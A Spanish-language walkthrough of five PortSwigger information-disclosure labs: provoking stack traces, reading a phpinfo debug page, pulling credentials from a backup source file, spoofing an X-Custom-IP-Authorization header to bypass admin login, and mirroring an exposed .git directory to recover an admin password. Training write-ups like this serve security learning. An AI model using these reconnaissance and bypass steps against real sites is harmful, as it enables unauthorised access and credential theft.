---
layout: default
title: "Information disclosure vulnerabilities - PortSwigger"
permalink: /information-disclosure-ps/
---

# Information disclosure vulnerabilities - PortSwigger

Todos los laboratorios posteriormente expuestos los puedes encontrar para resolverlos en el siguiente link.

[https://portswigger.net/web-security/information-disclosure](https://portswigger.net/web-security/information-disclosure)

## Índice



## 1. Lab: Information disclosure in error messages

```
Los mensajes de error detallados de este laboratorio revelan que está utilizando una versión vulnerable de un marco de trabajo de terceros. Para resolver el laboratorio, obtenga y envíe el número de versión de este marco.
```

Para ello vamos a un post cualquiera, como por ejemplo el siguiente:

```bash
https://ac021f2c1ef6afe380996b3f004c0037.web-security-academy.net/product?productId=1
```

Y generamos un error como borrar el valor del parametro **productId**.

```bash
https://ac021f2c1ef6afe380996b3f004c0037.web-security-academy.net/product?productId='
```

 Y generamos el siguiente error.

```bash
Internal Server Error: java.lang.NumberFormatException: For input string: "'"
	at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)
	at java.base/java.lang.Integer.parseInt(Integer.java:638)
	at java.base/java.lang.Integer.parseInt(Integer.java:770)
	at lab.data.productcatalog.catalog.DefaultProductCatalogDataSource.getProduct(DefaultProductCatalogDataSource.java:73)
	at lab.display.productcatalog.filter.NoFilterStrategy.getProduct(NoFilterStrategy.java:47)
	at lab.display.productcatalog.page.product.SimpleProductStrategy.handle(SimpleProductStrategy.java:67)
	at lab.display.productcatalog.page.SimpleProductPageStrategy.lambda$handleSubRequest$0(SimpleProductPageStrategy.java:82)
	at net.portswigger.util.Unchecked.lambda$null$3(Unchecked.java:46)
	at net.portswigger.util.Unchecked.uncheck(Unchecked.java:73)
	at net.portswigger.util.Unchecked.lambda$uncheckedFunction$4(Unchecked.java:46)
	at java.base/java.util.Optional.map(Optional.java:265)
	at lab.display.productcatalog.page.SimpleProductPageStrategy.handleSubRequest(SimpleProductPageStrategy.java:77)
	at lab.server.vulnerable.backend.SubHandler.handle(SubHandler.java:41)
	at lab.display.productcatalog.SimpleProductCatalogStrategy.handle(SimpleProductCatalogStrategy.java:75)
	at lab.server.vulnerable.backend.Backend.applyChain(Backend.java:344)
	at lab.server.vulnerable.backend.Backend.lambda$handler$1(Backend.java:289)
	at net.portswigger.util.Unchecked.lambda$null$3(Unchecked.java:46)
	at net.portswigger.util.Unchecked.uncheck(Unchecked.java:73)
	at net.portswigger.util.Unchecked.lambda$uncheckedFunction$4(Unchecked.java:46)
	at java.base/java.util.Optional.flatMap(Optional.java:294)
	at lab.server.vulnerable.backend.Backend.handler(Backend.java:251)
	at lab.server.vulnerable.backend.Backend.handle(Backend.java:239)
	at lab.server.vulnerable.frontend.NoFrontend.handle(NoFrontend.java:37)
	at lab.server.vulnerable.VulnerableApp.handle(VulnerableApp.java:111)
	at lab.server.LabHosts.handle(LabHosts.java:81)
	at lab.server.LabApp.handle(LabApp.java:167)
	at lab.server.LabApp.handle(LabApp.java:51)
	at net.portswigger.http.server.HttpServer$Connection.handleRequest(HttpServer.java:831)
	at net.portswigger.http.server.HttpServer$Connection.runHttp(HttpServer.java:817)
	at net.portswigger.http.server.HttpServer$Connection.run(HttpServer.java:756)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
	at java.base/java.lang.Thread.run(Thread.java:834)

Apache Struts 2 2.3.31
```

Siendo la solucion:

```bash
Apache Struts 2 2.3.31
```

Enviamos la respuesta y completamos el laboratorio.

![](img1.png)

## 2. Lab: Information disclosure on debug page

```
Este laboratorio contiene una página de depuración que revela información confidencial sobre la aplicación. Para resolver el laboratorio, obtenga y envíe la variable de entorno SECRET_KEY.
```

Revisando el codigo fuente del laboratorio nos encontramos con lo siguiente:

```html
                        <div>
                            <img src="/image/content/productcatalog/products/1.jpg">
                            <h3>Eggtastic, Fun, Food Eggcessories</h3>
                            <img src="/resources/images/rating4.png">
                            $27.60
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
                </div>
            </section>
```

Existe una ruta en donde nos podemos topar con un archivo phpinfo.php, que tiene el nombre de **Debug**. Entonces accedemos a la ruta

```
https://ace81f711f47a55d803d2973000a00a8.web-security-academy.net/cgi-bin/phpinfo.php
```

Y ahi dentro buscamos entre toda la informacion interesante el nombre de la variable de entorno **SECRET_KEY**.

```
SECRET_KEY	jkz8p8xls3tgv9z1l5ztffdsgpvv173y
```

Entonces enviamos la solucion y completamos el laboratorio.

![](img2.png)

## 3. Lab: Source code disclosure via backup files

```
Este laboratorio filtra su código fuente a través de archivos de respaldo en un directorio oculto. Para resolver el laboratorio, identifique y envíe la contraseña de la base de datos, que está codificada en el código fuente filtrado.
```

Buscamos directorios posibles, y nos topamos con que el directorio **backup** existe, y dentro de el encontramos un archivo llamado **ProductTemplate.java.bak** , la ruta sería.

```
https://ac371fb21ec0935c80fa104d00c30038.web-security-academy.net/backup/ProductTemplate.java.bak
```

Luego leyendo el codigo del archivo nos encontramos con lo siguiente.

```java
        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "tdutsjroyh43uwjtfq0gqoohgpd4hynr"
        ).withAutoCommit();
```

Entonces, concluimos que la contraseña de la base de datos es:

```
tdutsjroyh43uwjtfq0gqoohgpd4hynr
```

Entonces, enviamos la solucion y completamos el laboratorio.

![](img3.png)

## 4. Lab: Authentication bypass via information disclosure

```
La interfaz de administración de este laboratorio tiene una vulnerabilidad de omisión de autenticación, pero no es práctico explotarla sin el conocimiento de un encabezado HTTP personalizado utilizado por el front-end.

Para resolver el laboratorio, obtenga el nombre del encabezado y luego utilícelo para omitir la autenticación del laboratorio. Accede a la interfaz de administración y elimina la cuenta de Carlos.

Puede acceder a su propia cuenta con las siguientes credenciales: wiener:peter
```

Accedemos a la ruta **/admin** y nos encontramos con el siguiente mensaje:

![](img4.png)

Entonces, lo que haremos será enviar el paquete **GET** a el repeater y cambiar el metodo **GET** por el metodo **TRACE**.

![](img5.png)

Entre todos los headers que nos devuelve la consulta **TRACE** nos topamos con uno interesante,

```
X-Custom-IP-Authorization: 179.6.192.124
```

Por lo cual en la consulta **GET** anterior, enviaremos la misma solicitud pero enviando este header de **HTTP** cambiando el valor de la IP por 127.0.0.1, que vendría simular el acceso de un usuario de manera local.

![](img6.png)

Como podemos ver, esto ah funcionado, entonces ahora interceptaremos los paquetes al cargar el panel de administracion desde el navegador agregando el header correcto el cual es:

```
X-Custom-IP-Authorization: 127.0.0.1
```

![](img7.png)

Y podemos ver que visualizamos el panel de administracion,

![](img8.png)

Y eliminamos el usuario carlos y completamos el laboratorio.

**NOTA: Para todos los paquetes interceptados agregar el header antes expuesto.**

![](img9.png)

## 5. Lab: Information disclosure in version control history

```
Este laboratorio divulga información confidencial a través de su historial de control de versiones. Para resolver el laboratorio, obtenga la contraseña del administrador. Luego, inicie sesión como administratory elimine la cuenta de Carlos.
```

Empezaremos accediando al recurso **/.git** para verificar si existe.

![](img10.png)

Luego lo que haremos será bajarnos todo el directorio **.git** para ello vamos a realizar el siguiente comandos:

```
└──╼ $wget -m https://ac3d1f321f2ccec2800b4ff800f2009a.web-security-academy.net/.git
```

Luego accedemos al directorio creado con el dominio del sitio y realizamos un **ls -a**

```
└──╼ $ls -a
.  ..  .git
```

Entonces lo que haremos será listar los commits presentes en dicho reposito:

```
└──╼ $git log
error: unable to open object pack directory: .git/objects/pack: Not a directory
commit 70de767ae50d4c7d753500623117079829aa6288 (HEAD -> master)
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit fda17286f4bc8e44c826b3023c97d4e6ad325f4d
Author: Carlos Montoya <carlos@evil-user.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel
```

Y ahora como vemos existe un commit que nos dice que se removió la contraseña del admin de la configuracion, así que iremos a un commit anterior para ser mas exactos:

```
commit fda17286f4bc8e44c826b3023c97d4e6ad325f4d
```

Lo cual lo realizaremos con el comando **git checkout HASH** y luego vemos que nos genera un archivo que contiene la contraseña.

```
└──╼ $git checkout fda17286f4bc8e44c826b3023c97d4e6ad325f4d
.......
└──╼ $cat admin.conf 
ADMIN_PASSWORD=v3skb3qc19euezckz628
```

Ahora nos logeamos con el usuario **administrator** y la contraseña **v3skb3qc19euezckz628** y eliminamos a carlos para completar el laboratorio.

![](img11.png)

## CONCLUSION

Esta seccion de laboratorio nos sirve para identificar todas esos datos que nos pueden servir para desarrollar tecnicas de ataque mas elaboradas para el objetivo que tengamos.